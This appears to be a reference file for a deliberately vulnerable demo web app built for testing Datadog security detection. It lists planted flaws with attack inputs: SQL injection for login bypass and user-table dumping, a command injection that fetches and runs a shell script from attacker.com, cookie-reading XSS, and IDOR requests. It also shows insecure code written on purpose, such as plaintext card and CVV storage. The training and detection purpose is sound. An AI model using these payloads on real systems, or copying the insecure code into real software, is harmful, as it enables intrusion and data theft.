# Security Vulnerabilities Reference

This document catalogs the intentional security vulnerabilities in the Insecure Pizza & Coffee application.

## 🔴 Critical Vulnerabilities

### 1. SQL Injection (CWE-89)

**Location**: Multiple endpoints
- `src/routes/auth.js` - Login and registration
- `src/routes/orders.js` - Menu filtering, order placement
- `src/routes/payment.js` - Payment processing
- `src/routes/admin.js` - Order search

**Example**:
```javascript
// auth.js line 18
const query = `SELECT * FROM users WHERE username = '${username}'`;
```

**Attack Vector**:
```bash
# Bypass authentication
username: admin' OR '1'='1' --
password: anything

# Data exfiltration
category: pizza' UNION SELECT id,username,password,email,1,1,1,1 FROM users --
```

**Datadog Detection**: ASM will detect and alert on SQL injection patterns

---

### 2. Command Injection (CWE-78)

**Location**: `src/routes/admin.js` - Line 91

**Example**:
```javascript
exec(command, (error, stdout, stderr) => {
  // Executes arbitrary system commands
});
```

**Attack Vector**:
```bash
# Execute system commands
command: ls -la; cat /etc/passwd
command: wget http://attacker.com/shell.sh && chmod +x shell.sh && ./shell.sh
```

**Datadog Detection**: Runtime Security will detect suspicious process execution

---

### 3. Sensitive Data Exposure (CWE-311)

**Location**: `src/routes/payment.js`

**Issues**:
- Credit card numbers stored in plaintext (line 40-46)
- CVV codes stored in database
- Payment details logged in console (line 28-34)
- Sensitive data sent to APM traces (line 37-39)

**Example**:
```javascript
// Storing plaintext card data
const paymentQuery = `INSERT INTO payment_transactions
  (order_id, payment_method, card_number, card_holder, cvv, ...)
  VALUES (..., '${cardNumber}', '${cardHolder}', '${cvv}', ...)`;
```

**Datadog Detection**: ASM will detect sensitive data in traces and logs

---

## 🟠 High Vulnerabilities

### 4. Insecure Direct Object References - IDOR (CWE-639)

**Location**: `src/routes/orders.js`

**Issues**:
- Any authenticated user can view any order (line 129-156)
- User can access other users' order history via userId parameter (line 159-175)

**Attack Vector**:
```bash
# View any order
GET /orders/confirmation/1
GET /orders/confirmation/999

# Access other users' orders
GET /orders/my-orders?userId=2
```

**Datadog Detection**: ASM will detect unauthorized access patterns

---

### 5. Cross-Site Scripting - XSS (CWE-79)

**Location**: Multiple views
- No input sanitization on user-provided data
- Direct rendering of user input in templates

**Attack Vector**:
```javascript
// Register with malicious username
username: <script>alert('XSS')</script>

// Order notes
notes: <img src=x onerror=alert(document.cookie)>
```

**Datadog Detection**: ASM will detect XSS payloads in requests

---

### 6. Broken Authentication (CWE-287)

**Location**: `src/server.js` - Session configuration

**Issues**:
```javascript
app.use(session({
  secret: 'insecure-secret',  // Weak secret
  cookie: {
    secure: false,            // Should be true with HTTPS
    httpOnly: false,          // Vulnerable to XSS
  }
}));
```

**Attack Vector**:
- Session hijacking via XSS
- Session fixation
- Weak session secrets

**Datadog Detection**: ASM will detect session manipulation attempts

---

## 🟡 Medium Vulnerabilities

### 7. Missing Function Level Access Control (CWE-285)

**Location**: `src/routes/admin.js`

**Issues**:
- Weak admin check (line 7-13)
- No role verification on sensitive operations
- Admin routes only check session variable

**Attack Vector**:
```javascript
// Manipulate session
req.session.user.isAdmin = true;
```

---

### 8. Username Enumeration (CWE-203)

**Location**: `src/routes/auth.js` - Line 77-96

**Issue**: Different error messages reveal if username exists

```javascript
if (users.length === 0) {
  return res.json({ error: 'User not found' }); // Reveals user doesn't exist
}
```

---

### 9. Information Disclosure (CWE-200)

**Location**: Multiple error handlers

**Issues**:
- Verbose error messages expose internal details
- Stack traces sent to clients
- Database error messages revealed

**Example**:
```javascript
res.render('login', { error: `Error: ${error.message}` });
```

---

### 10. Weak Password Policy (CWE-521)

**Location**: `src/routes/auth.js` - Registration

**Issues**:
- No password complexity requirements
- No minimum length enforcement
- No password strength validation

---

## 🔵 Low Vulnerabilities

### 11. No Input Validation (CWE-20)

**Location**: All input handling

**Issues**:
- No validation on form inputs
- No sanitization of user data
- No length restrictions

---

### 12. Insecure Session Management (CWE-384)

**Issues**:
- No session timeout
- No session regeneration after login
- Session data stored client-side accessible

---

### 13. Security Misconfiguration (CWE-16)

**Issues**:
- Debug mode enabled in production
- Default credentials
- Verbose error messages
- Missing security headers

---

## 🔍 How to Test

### Using Datadog

1. **Enable all security features** in `.env`:
   ```env
   DD_APPSEC_ENABLED=true
   DD_IAST_ENABLED=true
   DD_APPSEC_SCA_ENABLED=true
   ```

2. **View Security Signals** in Datadog:
   - Navigate to Security > Application Security
   - Filter by service: `insecure-pizza-coffee`

3. **Check IAST Vulnerabilities**:
   - Navigate to Security > Application Vulnerabilities
   - Review detected code-level vulnerabilities

4. **Monitor Runtime Security**:
   - Navigate to Security > Cloud Workload Security
   - Watch for suspicious process execution

### Manual Testing

Use tools like:
- **SQLMap** for SQL injection
- **Burp Suite** for web vulnerability scanning
- **OWASP ZAP** for automated security testing
- **curl** for API testing

---

## 📚 References

- [OWASP Top 10 2021](https://owasp.org/www-project-top-ten/)
- [CWE Top 25](https://cwe.mitre.org/top25/)
- [Datadog Security Documentation](https://docs.datadoghq.com/security/)

---

**Remember**: These vulnerabilities are intentional. Never deploy this application in production!
